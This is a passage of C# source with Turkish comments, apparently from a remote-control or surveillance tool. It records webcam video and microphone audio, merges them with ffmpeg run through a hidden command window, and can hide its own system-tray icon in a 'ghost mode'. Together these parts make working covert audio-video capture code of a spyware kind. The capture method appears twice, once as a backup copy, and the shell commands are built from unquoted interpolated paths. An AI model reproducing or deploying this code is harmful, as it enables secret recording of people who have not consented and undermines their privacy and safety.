                            return null;
                        }
                    }
                    catch (Exception) { return null; }
                }
                try
                {
                    if (noMicFound == false)
                    {
                        if (logMessages) log("TT NO MIC FOUND:" + noMicFound.ToString());
                        string ffmpegPath = Path.Combine(Application.StartupPath.ToString(), "ffmpeg.exe");
                        string wavPath = Path.Combine(Application.StartupPath.ToString(), "temp.wav");
                        string mp3Path = Path.Combine(Application.StartupPath.ToString(), "temp.mp3");
                        string mp4Path = Path.Combine(Application.StartupPath.ToString(), "temp.mp4");
                        string outMp4Path = Path.Combine(Application.StartupPath.ToString(), "temp2.mp4");
                        Process pg = new Process();
                        pg.StartInfo.FileName = "CMD.EXE";
                        pg.StartInfo.Arguments = $"/C {ffmpegPath} -i {mp4Path} -i {mp3Path} -map 0:v -map 1:a -c:v copy -c:a copy -strict -1 {outMp4Path} -y";
                        pg.StartInfo.RedirectStandardError = false;
                        pg.StartInfo.RedirectStandardOutput = false;
                        pg.StartInfo.CreateNoWindow = true;
                        pg.StartInfo.UseShellExecute = false;
                        try
                        {
                            pg.Start();
                            pg.WaitForExit();
                            return "temp2.mp4";
                        }
                        catch (Exception ex)
                        {
                            if (logMessages) log(ex.ToString());
                            MediaFoundationApi.Shutdown();
                            return null;
                        }
                    }
                    else
                    {
                        MediaFoundationApi.Shutdown();
                        return "temp.mp4";
                    }

                }
                catch (Exception ex)
                {
                    if (logMessages) log(ex.ToString());
                    MediaFoundationApi.Shutdown();
                    return null;
                }
                finally { MediaFoundationApi.Shutdown(); }
            }
            catch (Exception ex)
            {
                if (logMessages) log(ex.ToString());
                MediaFoundationApi.Shutdown();
                return null;
            }
        }
        #endregion
        #region Kameradan video çekme metodu Yedek
        static private async Task<string> CaptureVideoAsync(TimeSpan time, double fps)
        {
            bool noMicFound = false;
            try
            {
                //Zaten varolan dosyaları sil.
                try
                {
                    if (System.IO.File.Exists("./temp.mp4")) System.IO.File.Delete("./temp.mp4");
                    if (System.IO.File.Exists("./temp2.mp4")) System.IO.File.Delete("./temp2.mp4");
                    if (System.IO.File.Exists("./temp.mp3")) System.IO.File.Delete("./temp.mp3");
                    if (System.IO.File.Exists("./temp.wav")) System.IO.File.Delete("./temp.wav");
                }
                catch (Exception ex) { if (logMessages) log(ex.ToString()); }

                //audio rec
                MediaFoundationApi.Startup();
                await Task.Delay(TimeSpan.FromSeconds(1));
                var waveIn = new WaveInEvent();
                WaveFileWriter writer = null;
                writer = new WaveFileWriter("./temp.wav", waveIn.WaveFormat);
                try
                {
                    waveIn.StartRecording();
                    waveIn.DataAvailable += (s, a) =>
                    {
                        writer.Write(a.Buffer, 0, a.BytesRecorded);
                    };
                }
                catch (Exception ex) { if (logMessages) log(ex.ToString()); noMicFound = true; if (logMessages) log("NO MIC FOUND:" + noMicFound.ToString()); }
                //video rec
                var video = new VideoCapture(0);
                var videoWriter = new VideoWriter("temp.mp4", VideoWriter.Fourcc('X', '2', '6', '4'), fps, new Size(video.Width, video.Height), true);
                var startTime = DateTime.Now;
                var duration = time;
                try
                {
                    while (DateTime.Now - startTime < duration)
                    {
                        var frame = new Mat();
                        video.Read(frame);
                        if (frame.IsEmpty) break;
                        videoWriter.Write(frame);
                    }
                }
                catch (Exception ex)
                {
                    waveIn.StopRecording();
                    await Task.Delay(TimeSpan.FromSeconds(1));
                    waveIn.Dispose();
                    writer.Dispose();
                    videoWriter.Dispose();
                    video.Dispose();
                    if (logMessages) log($"{ex}");
                    return null;
                }
                finally
                {
                    if (waveIn != null)
                    {
                        waveIn.StopRecording();
                        await Task.Delay(TimeSpan.FromSeconds(1));
                        waveIn.Dispose();
                    }
                    if (writer != null)
                        writer.Dispose();
                    if (videoWriter != null)
                        videoWriter.Dispose();
                    if (video != null)
                        video.Dispose();
                }

                //Combine video and audio
                if (!noMicFound)
                {
                    try
                    {
                        string ffmpegPath = Path.Combine(Application.StartupPath.ToString(), "ffmpeg.exe");
                        string wavPath = Path.Combine(Application.StartupPath.ToString(), "temp.wav");
                        string mp4Path = Path.Combine(Application.StartupPath.ToString(), "temp.mp4");
                        string outMp3Path = Path.Combine(Application.StartupPath.ToString(), "temp.mp3");
                        Process p = new Process();
                        p.StartInfo.FileName = "CMD.EXE";
                        p.StartInfo.Arguments = $"/C {ffmpegPath} -i {wavPath} -vn -ar 44100 -ac 2 -b:a 192k -strict -1 {outMp3Path} -y";
                        p.StartInfo.RedirectStandardError = false;
                        p.StartInfo.RedirectStandardOutput = false;
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.UseShellExecute = false;
                        try
                        {
                            p.Start();
                            p.WaitForExit();
                        }
                        catch (Exception ex)
                        {
                            if (logMessages) log(ex.ToString());
                            MediaFoundationApi.Shutdown();
                            return null;
                        }
                    }
                    catch (Exception) { return null; }
                }
                try
                {
                    if (noMicFound == false)
                    {
                        if (logMessages) log("TT NO MIC FOUND:" + noMicFound.ToString());
                        string ffmpegPath = Path.Combine(Application.StartupPath.ToString(), "ffmpeg.exe");
                        string wavPath = Path.Combine(Application.StartupPath.ToString(), "temp.wav");
                        string mp3Path = Path.Combine(Application.StartupPath.ToString(), "temp.mp3");
                        string mp4Path = Path.Combine(Application.StartupPath.ToString(), "temp.mp4");
                        string outMp4Path = Path.Combine(Application.StartupPath.ToString(), "temp2.mp4");
                        Process pg = new Process();
                        pg.StartInfo.FileName = "CMD.EXE";
                        pg.StartInfo.Arguments = $"/C {ffmpegPath} -i {mp4Path} -i {mp3Path} -map 0:v -map 1:a -c:v copy -c:a copy -strict -1 {outMp4Path} -y";
                        pg.StartInfo.RedirectStandardError = false;
                        pg.StartInfo.RedirectStandardOutput = false;
                        pg.StartInfo.CreateNoWindow = true;
                        pg.StartInfo.UseShellExecute = false;
                        try
                        {
                            pg.Start();
                            pg.WaitForExit();
                            return "temp2.mp4";
                        }
                        catch (Exception ex)
                        {
                            if (logMessages) log(ex.ToString());
                            MediaFoundationApi.Shutdown();
                            return null;
                        }
                    }
                    else
                    {
                        MediaFoundationApi.Shutdown();
                        return "temp.mp4";
                    }

                }
                catch (Exception ex)
                {
                    if (logMessages) log(ex.ToString());
                    MediaFoundationApi.Shutdown();
                    return null;
                }
                finally { MediaFoundationApi.Shutdown(); }
            }
            catch (Exception ex)
            {
                if (logMessages) log(ex.ToString());
                MediaFoundationApi.Shutdown();
                return null;
            }
        }
        #endregion
        #region Sistem tepsisindeki simgeyi gizleme metodu

      #pragma warning disable CS1998 // Beklemeyelim
        static private async Task hideSystemTray(bool option)
        {
  
            Form1 f1 = Application.OpenForms["Form1"] as Form1;
            NotifyIcon n =f1.notifyIcon1;
            try
            {
                if (option) { 
                    if (!System.IO.File.Exists("./noNotificationTray"))
                        System.IO.File.WriteAllText("./noNotificationTray", "hayalet modu");
                    n.Visible = false;
                }
                else if (!option) { 
                    if (System.IO.File.Exists("./noNotificationTray")) 
                        System.IO.File.Delete("./noNotificationTray");
                    n.Visible = true;
                }

            }
            catch (Exception ex)
            {
                if (logMessages) MessageBox.Show($"Sistem tepsisinde gizlemeye çalışırken hata ile karşılaşıldı!\n{ex}"); 
            }

        }        
        #pragma warning restore CS1998 // Beklemeyelim
        #endregion
    }
}
